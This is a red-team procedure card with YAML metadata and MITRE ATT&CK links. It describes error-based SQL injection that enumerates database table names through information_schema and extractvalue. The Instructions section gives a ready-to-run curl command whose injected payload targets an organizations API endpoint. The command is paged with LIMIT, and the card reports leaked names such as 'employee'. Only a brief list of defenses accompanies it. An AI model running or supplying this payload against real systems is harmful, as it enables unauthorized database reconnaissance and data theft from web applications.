---
id: proc-uuid-004
name: Extract-Table-Names-from-Information-Schema
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.496Z'
tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
sub_techniques: []
tags:
  - sqli
  - schema-enum
  - information-schema
commands:
  - '[[commands/curl-extract-tables]]'
platforms:
  - Web
  - MySQL
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
mitre_tactics:
  - '[[Discovery]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---

# Extract-Table-Names-from-Information-Schema

## Summary

This procedure uses SQL injection to query information_schema.tables and leak table names via error messages, paginated with LIMIT.

## Description

Payload selects table_name from information_schema.tables with LIMIT for enumeration, triggering extractvalue error to reveal names like 'task_header', 'employee'.

## Requirements

1. Database name from prior step
2. HTTP client

## Defense

- Restrict information_schema access
- Input validation on parameters
- Anomaly detection on query patterns

## Objectives

1. Enumerate database tables
2. Identify sensitive structures

## Instructions

### Step 1: Query Tables with Pagination

**Context**: Use LIMIT 54,1 as example; adjust for full enum.

**Command** ([[commands/curl-extract-tables]]):
```bash
curl -X GET "https://target.com/api/organizations/'or(extractvalue(1,concat(1,(select(table_name)from information_schema.tables limit 54,1))))='" -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" -H "Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3" -H "Accept-Encoding: gzip, deflate" -H "Upgrade-Insecure-Requests: 1" --compressed
```

> Expected: Error leaking table names from the database.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery
- [[Collection]] Collection

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[File and Directory Discovery]] File and Directory Discovery (DB schema)

### Sub-Techniques


## Commands Used

- [[commands/curl-extract-tables]]

## Tools Used


## Tags

- [[sqli]]
- [[schema-enum]]
- [[information-schema]]
